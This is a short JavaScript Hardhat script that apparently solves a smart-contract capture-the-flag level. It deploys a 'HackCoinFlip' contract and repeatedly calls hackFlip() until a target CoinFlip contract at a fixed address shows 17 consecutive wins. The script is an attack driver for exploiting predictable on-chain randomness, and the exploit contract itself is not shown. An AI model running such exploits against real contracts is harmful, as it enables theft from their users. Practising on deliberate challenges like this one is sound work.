const main = async () => {
  const [signer] = await ethers.getSigners();

  const contractFactory = await ethers.getContractFactory('HackCoinFlip');
  let contract = await contractFactory.deploy();
  while ((await getConsecutiveWins()) < 17) {
    await contract.hackFlip();
    await new Promise((r) => setTimeout(r, 10000));
  }
};

const getConsecutiveWins = async () => {
  const factoryCoinFlip = await ethers.getContractFactory('CoinFlip');
  const coinFlip = await factoryCoinFlip.attach(
    '0xB63269c7617692E55e41b39530a92033e3d6F936'
  );
  let wins = await coinFlip.consecutiveWins();
  console.log(wins.toString());
  return Number(wins);
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
